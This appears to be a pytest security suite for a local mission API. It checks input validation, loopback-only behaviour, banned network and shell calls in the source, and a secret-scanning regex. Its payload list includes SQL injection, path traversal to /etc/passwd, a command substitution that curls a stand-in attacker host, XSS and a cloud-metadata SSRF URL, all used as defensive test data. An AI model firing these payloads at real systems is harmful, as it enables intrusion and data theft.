"""Security: malformed/oversized input, injection payloads, no-network,
no-mutation, secret scan, loopback binding."""

from __future__ import annotations

from tests.founder_runtime.deciders import FOUNDER

import json
import pathlib
import re
import urllib.error
import urllib.request

import pytest

from recipe_engine.founder_runtime.api.client import ApiClientError

REPO_ROOT = pathlib.Path(__file__).resolve().parents[3]
API_PKG = REPO_ROOT / "recipe_engine" / "founder_runtime" / "api"


INJECTION_PAYLOADS = [
    "'; DROP TABLE missions;--",
    "../../etc/passwd",
    "$(curl http://evil.example/x)",
    "{{7*7}}",
    "<script>alert(1)</script>",
    "\x00\x01\x02 null bytes",
    "http://169.254.169.254/latest/meta-data",
]


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_injection_objective_is_data_not_command(service, payload):
    res = service.create_mission(objective=payload, idempotency_key=f"inj-{abs(hash(payload))}")
    # treated as data; mission created or blocked, never executed
    assert res["envelope"]["mission_id"]
    got = service.get_mission(res["envelope"]["mission_id"])
    assert got["mission"]["objective"]  # stored verbatim as text
    integ = service.runtime.store.verify_integrity()
    assert integ["ok"]


def test_malformed_json_rejected(running_server):
    client, port = running_server
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/v1/missions", data=b"{not json", method="POST")
    req.add_header("Authorization", f"Bearer {client._token}")
    req.add_header("Content-Type", "application/json")
    req.add_header("Idempotency-Key", "m1")
    with pytest.raises(urllib.error.HTTPError) as ei:
        urllib.request.urlopen(req, timeout=5)
    assert ei.value.code in (400, 422)


def test_missing_objective_rejected(running_server):
    client, _ = running_server
    with pytest.raises(ApiClientError) as ei:
        client._req("POST", "/v1/missions", body={"title": "no objective"},
                    idempotency_key="m2")
    assert ei.value.status == 422


def test_oversized_body_rejected(running_server):
    client, port = running_server
    big = "x" * (128 * 1024)
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/v1/missions",
        data=json.dumps({"objective": big}).encode(), method="POST")
    req.add_header("Authorization", f"Bearer {client._token}")
    req.add_header("Content-Type", "application/json")
    req.add_header("Idempotency-Key", "m3")
    with pytest.raises(urllib.error.HTTPError) as ei:
        urllib.request.urlopen(req, timeout=5)
    assert ei.value.code == 413


def test_unknown_mission_404(service):
    from recipe_engine.founder_runtime.api.service import ApiError
    with pytest.raises(ApiError) as ei:
        service.get_mission("msn_does_not_exist")
    assert ei.value.status == 404


def test_no_external_network_in_api_source():
    """API must not fetch arbitrary URLs or call external providers."""
    banned = ("requests.get", "requests.post", "httpx.get", "httpx.post",
              "urlopen(http", "socket.connect", "subprocess", "os.system",
              "openai", "anthropic", "openrouter")
    for f in API_PKG.rglob("*.py"):
        text = f.read_text()
        for token in banned:
            assert token not in text, f"{f.name} contains banned token {token!r}"


def test_no_caller_controlled_path_or_command():
    """API takes no filesystem path or shell command from the caller."""
    for f in API_PKG.rglob("*.py"):
        text = f.read_text()
        assert "shell=True" not in text
        assert "os.path.join(request" not in text


def test_no_secret_in_source():
    """No hardcoded credentials in the API package."""
    pattern = re.compile(r"(sk-[A-Za-z0-9]{20,}|api[_-]?key\s*=\s*['\"][^'\"]{10,}|"
                         r"password\s*=\s*['\"][^'\"]+|BEGIN [A-Z ]*PRIVATE KEY)", re.I)
    for f in API_PKG.rglob("*.py"):
        assert not pattern.search(f.read_text()), f"possible secret in {f.name}"


def test_token_never_in_response(running_server, token):
    client, _ = running_server
    res = client.create_mission(objective="status", idempotency_key="tok1")
    assert token not in json.dumps(res)
    assert token not in json.dumps(client.adapters_status())
    assert token not in json.dumps(client.list_missions())


def test_mutation_not_authorized_in_envelope(service):
    res = service.create_mission(objective="deploy to production and mutate the database",
                                 idempotency_key="mut1")
    auth = res["envelope"]["authority"]
    assert auth["mutation_authorized"] is False
    assert auth["external_action_authorized"] is False
    assert auth["production_persistence_authorized"] is False


def test_approval_does_not_execute(service):
    res = service.create_mission(objective="status", idempotency_key="mut2")
    mid = res["envelope"]["mission_id"]
    out = service.approve_plan(mid, reason="ok", idempotency_key="mut2a",
                               expected_version=res["envelope"]["version"], decider=FOUNDER)
    assert out["executed"] is False
    # no EXECUTING transition was ever recorded
    states = [e["next_state"] for e in service.events(mid)["events"]]
    assert "EXECUTING" not in states
